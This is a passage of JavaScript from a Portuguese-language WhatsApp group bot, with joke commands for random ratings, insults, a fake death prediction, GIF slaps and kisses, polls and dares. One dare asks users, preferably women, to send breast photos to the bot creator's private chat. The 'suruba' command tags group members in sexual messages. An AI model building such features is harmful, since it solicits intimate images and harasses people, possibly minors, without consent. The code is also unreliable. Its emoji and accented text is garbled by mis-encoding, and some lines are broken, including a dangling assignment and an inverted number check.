if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
var maconheiroNumbers = [];
for (let i = 1; i <= 100; i++) {
maconheiroNumbers.push(i.toString());
}
var maconheiro = maconheiroNumbers[Math.floor(Math.random() * maconheiroNumbers.length)];
const maconheiroImageMessage = {
image: { url: "https://telegra.ph/file/1649e82841eaa55edbb81.jpg" },
caption: `vamos ver o quanto maconheiro vc √©\n\nSua porcentagem de ${command} √©: ${maconheiro}%\n üçÅüí®`
};
amy.sendMessage(from, maconheiroImageMessage);
break;

case 'pervertido':
if(!isGroup) return reply(`S√≥ pode ser utilizado este comando, em grupo.`)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
var pervertidoNumbers = [];
for (let i = 1; i <= 100; i++) {
pervertidoNumbers.push(i.toString());
}
var pervertido = pervertidoNumbers[Math.floor(Math.random() * pervertidoNumbers.length)];
const pervertidoImageMessage = {
image: { url: "https://telegra.ph/file/4cbafc0e0ff6cf26b7bd0.jpg" },
caption: `vamos ver o quanto pervertido vc √©\n\nSua porcentagem de „Äå${command}„Äç√©: ${pervertido}%\n üòèüîû`
};
amy.sendMessage(from, pervertidoImageMessage);
break;


case 'guloso':// by lucas mod domina 
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
amy.sendMessage(from, {text:`Pesquisando a ficha de ${command} da (o) @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: info})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
amy.sendMessage(from, {video: {url: 'https://telegra.ph/file/b90bef1238cd79d46cc38.mp4'}, gifPlayback: true, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa ${command}?\n‚Ä¢ A porcentagem de chance √© *${random}%*`, mentions: [sender_ou_n]}, {quoted: info})
}, 7000)
break


case 'gadometro':
case 'nivelgado':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
const chifre = ["üêÑ ultra extreme gado üêÑ",
"ü§¥ Gado-Master ü§¥",
"üëë Gado-Rei üëë",
"üêÑ Gado üêÑ",
"ü§° Escravo-ceta ü§°",
"üôá‚Äç‚ôÇÔ∏è Escravo-ceta Maximo üôá‚Äç‚ôÇÔ∏è",
"ü¶Ñ Gacorno? ü¶Ñ",
"üî• Jogador De Forno Livre<3 üî•",
"üîÆ Mestre Do Frifai<3<3 üîÆ",
"üêÆ Gado-Manso üêÆ",
"üåæ Gado-Conformado üåæ",
"üêÇ Gado-Incubado üêÇ",
"üåü Gado Deus üåü",
"üé© Mestre dos Gados üé©",
"üíî Topa tudo por buceta üíî",
"üêÆ Gado Comum üêÆ",
"üêÑ Mini Gadinho üêÑ",
"üå± Gado Iniciante üå±",
"üî∞ Gado Basico üî∞",
"‚öôÔ∏è Gado Intermediario ‚öôÔ∏è",
"üíé Gado Avan√ßado üíé",
"üåà Gado Profisional üåà",
"üîù Gado Mestre üîù",
"ü¶å Gado Chifrudo ü¶å",
"ü§è Corno Conformado ü§è",
"ü¶å Corno HiperChifrudo ü¶å",
"üëë Chifrudo Deus üëë",
"üëë Mestre dos Chifrudos üëë",
"üåæ Gado Livre üåæ",
"üíñ Gado Encantador üíñ",
"üëë Gado Supremo üëë",
"üè° Gado da Fazenda üè°",
"üíò Gado do Amor üíò",
"üíë Gado Rom√¢ntico üíë",
"üíó Gado Apaixonado üíó",
"üåô Gado Sonhador üåô",
"üíö Gado Fiel üíö",
"üîí Gado Determinado üîí",
"üìà Gado em Ascens√£o üìà",
"üß† Gado Realista üß†",
"üíì Gado de Cora√ß√£o üíì",
"üí° Gado Inspirador üí°",
"üí™ Gado Conquistador üí™",
"üåü Gado Confiante üåü",
"üòÑ Gado Irresist√≠vel üòÑ",
"üòç Gado Encantador üòç",
"ü•∞ Gado Carinhoso ü•∞",
"üòé Gado Charmoso üòé",
"ü§£ Gado Divertido ü§£",
"üòÇ Gado Engra√ßado üòÇ"];
const gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `EI CORNINHO MANSO, VC √â ${gado} üòÖ`
reply(hisil)
break;


case 'morte':
case 'previsao':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
amy.sendMsg = await amy.sendMessage(from, { react: { text: '‚ò†Ô∏è', key: info.key } });
const idade2 = ["30", "76", "25", "32", "27", "90", "72", "83", "73", "83", "74", "92", "100", "94", "48", "37", "53", "63"];
const idade = idade2[Math.floor(Math.random() * idade2.length)];
const causasMorte = [
"üíÄ Causa desconhecida",
"üíî Doen√ßa card√≠aca",
"üöó Acidente de carro",
"ü©∏ C√¢ncer",
"‚ò†Ô∏è Envenenamento",
"üõ©Ô∏è Queda de um avi√£o",
"üåä Afogamento",
"ü¶à Ataque de tubar√£o",
"üî® Acidente de trabalho",
"üî™ Assassinato",
"üî´ Suic√≠dio",
"üí• Explos√£o",
"üå™Ô∏è Desastre natural",
"üíä Overdose de drogas",
"üî• Ferimento fatal",
"‚õµ Acidente de barco",
"üèçÔ∏è Acidente de motocicleta",
"üå∑ Eletrocuss√£o",
"üî• Combust√£o espont√¢nea",
"üö≤ Acidente de bicicleta"
];
const causaMorte = causasMorte[Math.floor(Math.random() * causasMorte.length)];
const morte = `ùóòùó∂, ùóÆùó∫ùó∂ùó¥ùòÇùó∂ùóªùóµùóº ${pushname}! ùó¶ùó≤ùó¥ùòÇùóªùó±ùóº ùóºùòÄ ùó∞ùóÆÃÅùóπùó∞ùòÇùóπùóºùòÄ ùó≥ùó≤ùó∂ùòÅùóºùòÄ ùóΩùóºùóø ùóòùó∂ùóªùòÄùòÅùó≤ùó∂ùóª, ùòÉùóºùó∞ùó≤ÃÇ ùòÉùóÆùó∂ ùó∫ùóºùóøùóøùó≤ùóø ùó∞ùóºùó∫ ${idade} ùóÆùóªùóºùòÄ. üò±\n\nùóñùóÆùòÇùòÄùóÆ: ${causaMorte}!`;
amy.sendMessage(from, { image: { url: 'https://telegra.ph/file/66c9beff8806d0b1c023d.jpg' }, caption: morte}, {quoted: info})
break;

case 'chance':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (!isGroup) return reply(msg.grupo)
rate = body.slice(7)
zxzz = 
random = `${Math.floor(Math.random() * 200)}`
reply(' üò± A chance disso que voc√™ falou vai acontecer e de:‚ù∞ '+random+'% ‚ù± ‚úß ')
break

case 'quando':
if (args.length < 1) return reply('Digite a pergunta!')
const meupirul = ['Hoje', 'Amanh√£', 'Nunca', 'dia', 'semana', 'm√™s', 'ano']
const meupirul2 = ['dias', 'semanas', 'meses', 'anos']
randomm = meupirul[Math.floor(Math.random() * meupirul.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (randomm == 'Hoje' || randomm == 'Amanh√£' || randomm == 'Nunca') {
text = `Pergunta: ${body.slice(1)}\nResposta: ${randomm}`
} else if (random2 == 1) {
text = `Pergunta: ${body.slice(1)}\nResposta:1 ${randomm}`
} else {
random3 = meupirul2[Math.floor(Math.random() * meupirul2.length)]
text = `Pergunta: ${body.slice(1)}\nResposta: ${random2} ${random3}`
}
reply(text)
break


case 'surubao': case 'suruba':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (Number(q)) return reply(`Eita, coloque o n√∫mero de pessoas ap√≥s o comando.`)
if (Number(q.trim()) < 10) return reply("Coloque um n√∫mero menor, ou seja, menos de *10*.")
somembros = []
emojiskk = ["ü•µ", "üòà", "ü´£", "üòè"]
emojis = emojiskk[Math.floor(Math.random() * emojiskk.length)]  
frasekk = [`t√° querendo rela√ß√µes sexuais a ${q}, topa?`, `quer que *${q}* pessoas venham de *chicote, algema e corda de alpinista*.`, `quer que ${q} pessoas der tapa na cara, lhe chame de cachorra e fud3r bem gostosinho...`]
context = frasekk[Math.floor(Math.random() * frasekk.length)]  
ABC = `${emojis} @${sender.split('@')[0]} ${context}\n\n`
for (var i = 0; i < q; i++) {
ABC += `@${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
mencionarIMG(ABC, suruba);
break;

case 'tapa':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('ùó†ùóÆùóøùóæùòÇùó≤ ùóº ùóÆùóπùòÉùóº ùóæùòÇùó≤ ùòÉùóºùó∞ùó≤ÃÇ ùó±ùó≤ùòÄùó≤ùó∑ùóÆùóø ùó±ùóÆ ùóº ùòÅùóÆùóΩùóÆ ùóªùóÆ ùóøùóÆùóØùóÆ.')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voce ÃÇ acabou de dar um tapa gostoso na(o) üòè @${mentioned[0].split('@')[0]} üî•` 
jrq = await getBuffer(`${tapinha}`)
await amy.sendMessage(from, {video: jrq, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'beijo':
case 'beijar':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque alguem para dar o beijo')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voce deu um beijo gostoso na(o) @${mentioned[0].split('@')[0]} üòÅüëâüëà‚ù§` 
wew = await getBuffer(`${beijin}`)
await amy.sendMessage(from, {video: wew, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'matar': case 'mata':  
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque quem vc que matar')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voce acabou de matar o (a) @${mentioned[0].split('@')[0]} üòàüëπ` 
jrpp = await getBuffer(`${matei}`)
await amy.sendMessage(from, {video: jrpp, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'soco':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque quem voce que dar o soco')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voc√™ deu um  soc√£o no (a) @${mentioned[0].split('@')[0]} ü§°` 
jrq = await getBuffer(`${soquin}`)
await amy.sendMessage(from, {video: jrq, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break

case 'chute':
case 'chutar':  
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque quem voce quer chutar')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `${pushname} Voc√™ acabou de dar um chute na(o) @${mentioned[0].split('@')[0]} ü§°` 
jry = await getBuffer(`${chutin}`)
await amy.sendMessage(from, {video: jry, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: info})
break 

case 'desafio': 
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
{
const desafios = [
'ùòãùò¶ùò¥ùò¢ùòßùò™ùò∞ ùò∑ùò∞ùò§ùò¶ÃÇ a ùò§ùò∞ùòÆùò¶ùò≥ uma colher de ùò±ùò™ùòÆùò¶ùòØùòµùò¢ üå∂Ô∏è',
'Desafio ùò∑ùò∞ùò§ùò¶ÃÇ ùò¢ ùò±ùò∂ùò≠ùò¢ùò≥ ùò•ùò¶ ùò∂ùòÆ penhasco üèûÔ∏è',
'ùòãùò¶ùò¥ùò¢ùòßùò™ùò∞ voc√™ a passar uma ùò¥ùò¶ùòÆùò¢ùòØùò¢ sem ùò•ùò∞ùò≥ùòÆùò™ùò≥ üò¥',
'Desafio voc√™ a andar descal√ßo sobre brasas üî•',
'Desafio voc√™ a nadar com tubar√µes ü¶à',
'Desafio voc√™ a cantar em p√∫blico üé§',
'Desafio voc√™ a fazer um salto de paraquedas ü™Ç',
'Desafio voc√™ a passar um dia inteiro sem usar o celular üì±',
'Desafio voc√™ a dan√ßar no topo de um pr√©dio üï∫',
'Desafio voc√™ a fazer uma tatuagem surpresa üñåÔ∏è',
'Desafio voc√™ a atravessar um rio a nado üèä',
'Desafio voc√™ a aprender a andar de skate em um dia üõπ',
'Desafio voc√™ a fazer uma maratona de filmes em 24 horas üé¨',
'Desafio voc√™ a fazer um salto de bungee jumping üåâ',
'Desafio voc√™ a escalar uma montanha üßó',
'Desafio voc√™ a correr uma meia maratona üèÉ',
'Desafio voc√™ a experimentar uma comida ex√≥tica ü¶ó',
'Desafio voc√™ a aprender a tocar um instrumento em um m√™s üé∏',
'Desafio voc√™ a acampar sozinho(a) em um lugar isolado ‚õ∫',
'Desafio voc√™ a fazer um discurso em um evento importante üéôÔ∏è',
'Desafio voc√™ de prefer√™ncia g√™nero feminino a mandar fototeta no pv do meu criador rsrsü§≠',
];
const desafio = desafios[Math.floor(Math.random() * desafios.length)];
reply(`‚Ä¢ ùò¶ùò∂  ùòµùò¶ ùò•ùò¶ùò¥ùò¢ùòßùò™ùò∞ !\n [ ${desafio} ] \n ‚Ä¢ ùò§ùò¢ùò¥ùò∞ ùòØùò¢ùò∞ ùòßùò¢ùò§Ãßùò¢ ùò∞ ùò•ùò¶ùò¥ùò¢ùòßùò™ùò∞ ùò™ùò≥ùò¶ùò™ ùò§ùò¢ùò≥ùò™ùòÆùò£ùò¢ùò≥ ùò¥ùò∂ùò¢ ùò±ùò¢ùò¥ùò¥ùò¢ùò®ùò¶ùòÆ üòà`);
}
break;

case 'vab':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  

reagir(from, "ü§®")

const questions  = JSON.parse(fs.readFileSync('./arquivos/json/vab.json'));
const { pergunta1, pergunta2 } = questions[Math.floor(Math.random() * questions.length)]
sendPoll(from, "Voc√™ prefere..", [pergunta1, pergunta2]).catch(console.error);
break



case 'eununca':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(msg.modobn)   
reagir(from, "ü§®")
const pergunta_ = JSON.parse(fs.readFileSync('./arquivos/json/eununca.json'));
const getRandomINever = pergunta_[Math.floor(Math.random() * pergunta_.length)]
sendPoll(from, getRandomINever, ["Eu j√°", "Eu nunca"]).catch(console.error);
break

case 'gf':
if(!isGroup) return reply(reply.msg.grupo)
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!menc_os2 || menc_jid2[1]) return reply('marque a pessoa que voc√™ quer fazer gf, a mensagem ou o @')
amy.sendMessage(from, {video: {url: "https://telegra.ph/file/f3bb46b98fb57436a1413.mp4"}, gifPlayback: true, caption: `Voc√™ fez um GF gostoso com a(o) @${menc_os2.split('@')[0]} üòàüî•` , mentions: [menc_os2]}, {quoted: info})
break

case 'cassino':
